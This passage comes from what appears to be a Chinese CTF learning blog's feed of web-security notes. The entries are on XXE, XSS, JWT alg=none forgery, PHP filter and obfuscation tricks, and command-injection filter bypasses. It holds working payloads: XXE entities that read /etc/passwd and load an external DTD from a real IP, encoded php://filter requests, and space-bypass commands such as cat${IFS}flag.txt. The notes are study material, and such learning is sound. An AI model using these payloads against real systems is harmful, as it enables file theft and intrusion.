=&gt; $value) &#123;</span><br><span class="line">echo <span class="string">"%"</span>.dechex(ord($value)^<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line">echo <span class="string">"^"</span>;</span><br><span class="line">foreach ($arr as $key =&gt; $value) &#123;</span><br><span class="line">echo <span class="string">"%ff"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法三</p><p>取反+伪协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%CE%99%93%9E%98%D1%8F%97%8F));//</span><br></pre></td></tr></table></figure><p>关键代码取反</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=1flag.php</span><br></pre></td></tr></table></figure><p>生成脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">"p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = 1 f l a g . p h p"</span>;</span><br><span class="line">$arr1 = explode(<span class="string">' '</span>, $a);</span><br><span class="line">echo <span class="string">"&lt;br&gt;~("</span>;</span><br><span class="line">foreach ($arr1 as $key =&gt; $value) &#123;</span><br><span class="line">echo <span class="string">"%"</span>.bin2hex(~$value);</span><br><span class="line">&#125;</span><br><span class="line">echo <span class="string">")&lt;br&gt;"</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>系统命令学习</title>
      <link href="/2020/07/13/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/07/13/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cjm00n.top/Linux/system-command-learning.html" target="_blank" rel="noopener">系统命令学习</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux基础命令学习</title>
      <link href="/2020/07/13/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/07/13/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cjm00n.top/Linux/linux-command-learning.html" target="_blank" rel="noopener">linux基础命令学习</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux下的提权</title>
      <link href="/2020/06/19/Linux%E4%B8%8B%E7%9A%84%E6%8F%90%E6%9D%83/"/>
      <url>/2020/06/19/Linux%E4%B8%8B%E7%9A%84%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux下用SUID提权"><a href="#Linux下用SUID提权" class="headerlink" title="Linux下用SUID提权"></a>Linux下用SUID提权</h1><p><a href="https://blog.csdn.net/qq_36119192/article/details/84872644" target="_blank" rel="noopener">Linux下用SUID提权</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/2020/06/18/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/06/18/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CRLF Injection</title>
      <link href="/2020/06/14/CRLF-Injection/"/>
      <url>/2020/06/14/CRLF-Injection/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/d4c304dbd0af" target="_blank" rel="noopener">CRLF Injection漏洞的利用与实例分析</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JWT令牌攻击</title>
      <link href="/2020/06/13/JWT%E4%BB%A4%E7%89%8C%E6%94%BB%E5%87%BB/"/>
      <url>/2020/06/13/JWT%E4%BB%A4%E7%89%8C%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h3 id="博客讲解："><a href="#博客讲解：" class="headerlink" title="博客讲解："></a>博客讲解：</h3><blockquote><p>关于jwt的讲解： <a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a><br><a href="https://www.cnblogs.com/z-sm/p/9125995.html" target="_blank" rel="noopener">https://www.cnblogs.com/z-sm/p/9125995.html</a><br><a href="https://www.jianshu.com/p/1ce08a374bb5" target="_blank" rel="noopener">https://www.jianshu.com/p/1ce08a374bb5</a><br>jwt攻击手段：<a href="https://www.freebuf.com/articles/web/181261.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/181261.html</a></p><p><a href="https://www.cnblogs.com/karsa/p/12762297.html" target="_blank" rel="noopener">刷题EasyLogin</a></p></blockquote><a id="more"></a><p> 形式：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.（这里有一个点）eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.（这里也有一个点）TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ<br>第一个点前为header，第二个点前为payload，第二个点后为signture<br>一个攻击点：当header中的alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+’.’+ payload +’.’）并将其提交给服务器。 </p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSI注入漏洞</title>
      <link href="/2020/05/14/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/05/14/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844" target="_blank" rel="noopener">SSI注入漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF XSS</title>
      <link href="/2020/05/13/CTF-XSS/"/>
      <url>/2020/05/13/CTF-XSS/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/20175211lyz/p/12207467.html" target="_blank" rel="noopener">CTF XSS</a><br><a href="https://www.freebuf.com/articles/web/244253.html" target="_blank" rel="noopener">XSS Challenges通关和Beef介绍</a></p><blockquote><p>1:没有过滤,直接用标签即可 </p><script>alert(document.domain);</script><p>2:闭合标签,再引入script<br>11111”&gt;<script>alert(document.domain);</script><br>#或者闭合前边引号,引入事件<br>“ onmouseover=alert(document.domain)&gt; </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF XXE</title>
      <link href="/2020/05/13/CTF-XXE/"/>
      <url>/2020/05/13/CTF-XXE/</url>
      
        <content type="html"><![CDATA[<p>参考链接：<br><a href="https://www.freebuf.com/vuls/194112.html" target="_blank" rel="noopener">XXE萌新进阶全攻略</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">未知攻焉知防——XXE漏洞攻防</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489349&idx=1&sn=ab435be65bc6c35a21ea4bd040693d8c&source=41#wechat_redirect" target="_blank" rel="noopener">歪？我想要一个XXE。</a><br><a href="http://www.cl4y.top/xxe笔记/" target="_blank" rel="noopener">xxe笔记</a><br><a href="https://blog.szfszf.top/tech/blind-xxe-详解-google-ctf-一道题目分析/" target="_blank" rel="noopener">Blind XXE 详解 + Google CTF 一道题目分析</a><br><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html" target="_blank" rel="noopener">CTF XXE</a></p><h1 id="XXE-Attack"><a href="#XXE-Attack" class="headerlink" title="XXE Attack"></a>XXE Attack</h1><p>XML External Entity attack 即XXE XML外部实体攻击，通过构建非法xml实体，能够达到任意文件读取，甚至rce的目的。 </p><a id="more"></a><p>用以下的php代码来测试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h1><p>XML 即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是： HTML 被设计用来显示数据 XML 被设计用来传输和存储数据 </p><blockquote><p>参数实体用% name申明，引用时用%name;，只能在DTD中申明，DTD中引用。 </p><p>其余实体直接用name申明，引用时用&name;，只能在DTD中申明，可在xml文档中引用。 </p></blockquote><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。<br>DTD的声明：指XML文档中声明该文档的DTD或DTD来源的部分，可以包含在使用它的XML文档内部，也可以以独立的DTD文档（*.dtd）文档存在。</p><p>所以DTD一般认为有两种引用或声明方式：</p><blockquote><p>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。<br>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。<br>（网上有提到的引用公共DTD其实也算外部引用DTD的一种）</p></blockquote><h3 id="XML基本文档结构"><a href="#XML基本文档结构" class="headerlink" title="XML基本文档结构"></a>XML基本文档结构</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [ </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span>                                                                          </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DTD</strong> 引用方式(简要了解)</p><p><strong>1. DTD</strong> <strong>内部声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p><strong>2. DTD</strong> <strong>外部引用</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;外部DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>3.</strong> <strong>引用公共</strong>DTD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  &lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;......命名方法：以!DOCTYPE开始,configuration是文档根元素名称；PUBLIC表示是公共DTD；-表示是非ISO组织；mybatis.org表示组织；DTD 表示类型；Config 表示标签；3.0是标签后附带的版本号；EN表示DTD语言是英语；最后是DTD的URL；</span><br></pre></td></tr></table></figure><p><strong>DTD</strong> 实体声明</p><p><strong>1.</strong> <strong>内部实体声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号，示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p><strong>2.</strong> <strong>外部实体声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p><strong>3.</strong> <strong>参数实体声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">or</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;</span><br><span class="line">%xxe;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;evil;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>外部evil.dtd中的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY evil SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;</span><br></pre></td></tr></table></figure><h1 id="XXE-简介"><a href="#XXE-简介" class="headerlink" title="XXE 简介"></a>XXE 简介</h1><p>外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 </p><h3 id="恶意引入外部实体0x01"><a href="#恶意引入外部实体0x01" class="headerlink" title="恶意引入外部实体0x01"></a>恶意引入外部实体0x01</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="恶意引入外部实体0x02"><a href="#恶意引入外部实体0x02" class="headerlink" title="恶意引入外部实体0x02"></a>恶意引入外部实体0x02</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % file SYSTEM "http://118.25.14.40:8200/hack.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;hhh;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p>hack.dtd内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">hhh</span> <span class="attr">SYSTEM</span> '<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>'&gt;</span></span><br></pre></td></tr></table></figure><h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>这个很简单，利用正则匹配的不严格，大小写绕过</p><h3 id="html实体编码绕过"><a href="#html实体编码绕过" class="headerlink" title="html实体编码绕过"></a>html实体编码绕过</h3><p>如果过滤了http等协议，可以利用实体编码绕过：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a " &lt;!ENTITY %  b SYSTEM 'http://118.25.14.40:8200/hack.dtd'&gt; "&gt; </span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">    %b;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;hhh;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="data-协议绕过"><a href="#data-协议绕过" class="headerlink" title="data://协议绕过"></a>data://协议绕过</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a SYSTEM "data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMTguMjUuMTQuNDA6ODIwMC9oYWNrLmR0ZCc+"&gt;</span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">    %b;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;hhh;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--编码内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">b</span> <span class="attr">SYSTEM</span> '<span class="attr">http:</span>//<span class="attr">118.25.14.40:8200</span>/<span class="attr">hack.dtd</span>'&gt;</span></span><br></pre></td></tr></table></figure><h3 id="file-协议加文件上传"><a href="#file-协议加文件上传" class="headerlink" title="file://协议加文件上传"></a>file://协议加文件上传</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a SYSTEM "file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg"&gt;</span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">b</span> <span class="attr">SYSTEM</span> '<span class="attr">http:</span>//<span class="attr">118.25.14.40:8200</span>/<span class="attr">hack.dtd</span>'&gt;</span></span><br></pre></td></tr></table></figure><h3 id="php-filter协议加文件上传"><a href="#php-filter协议加文件上传" class="headerlink" title="php://filter协议加文件上传"></a>php://filter协议加文件上传</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a SYSTEM "php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg"&gt;</span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        &amp;hhh;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">hhh</span> <span class="attr">SYSTEM</span> '<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">./flag.php</span>'&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a SYSTEM "php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg"&gt;</span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        &amp;hhh;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF RCE(远程代码执行)</title>
      <link href="/2020/05/13/CTF-RCE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2020/05/13/CTF-RCE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/20175211lyz/p/11396392.html" target="_blank" rel="noopener">CTF RCE(远程代码执行)</a></p><h1 id="命令中空格被过滤的解决方法"><a href="#命令中空格被过滤的解决方法" class="headerlink" title="命令中空格被过滤的解决方法"></a>命令中空格被过滤的解决方法</h1><p>linux</p><blockquote><p>{cat,flag.txt}<br>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br>kg=$’\x20flag.txt’&amp;&amp;cat$kg<br>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</p></blockquote><a id="more"></a><p>windows下</p><blockquote><p>type.\flag.txt<br>type,flag.txt<br>echo,123456</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常见文件目录</title>
      <link href="/2020/05/12/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95/"/>
      <url>/2020/05/12/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>web服务器会将请求写入到日志文件中，比如说apache。当用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在/var/log/apahce2/ </p><a id="more"></a><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>登录注册类型要么sql注入要么session文件包含</p><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><ul><li>php默认生成的Session文件往往存在/tmp目录下</li><li>文件名为sess_PHPSESSID</li><li>session.upload_progress.enabled这个参数在php.ini默认开启，如果不是Off，就会在上传过程中生成上传进度文件，它的储存文件路径可以在phpinfo获取到</li></ul><h2 id="Nginx重要文件位置"><a href="#Nginx重要文件位置" class="headerlink" title="Nginx重要文件位置"></a>Nginx重要文件位置</h2><ul><li>配置文件存放目录：/etc/nginx</li><li>主配置文件：/etc/nginx/conf/nginx.conf 或 /etc/nginx/nginx.conf</li><li>管理脚本：/usr/lib64/systemd/system/nginx.service</li><li>模块：/usr/lisb64/nginx/modules</li><li>应用程序：/usr/sbin/nginx</li><li>程序默认存放位置：/usr/share/nginx/html</li><li>日志默认存放位置：/var/log/nginx</li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php_mt_seed</title>
      <link href="/2020/05/11/php-mt-seed/"/>
      <url>/2020/05/11/php-mt-seed/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">PHP mt_rand安全杂谈及应用场景详解</a><br><a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_seed - PHP mt_rand() seed cracker</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass_now = &quot;FpCyLNvPOj&quot;;</span><br><span class="line">$allowable_characters = &apos;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;;</span><br><span class="line"></span><br><span class="line">$length = strlen($allowable_characters) - 1;</span><br><span class="line"></span><br><span class="line">for ($j = 0; $j &lt; strlen($pass_now); $j++) &#123;</span><br><span class="line">    for ($i = 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        if ($pass_now[$j] 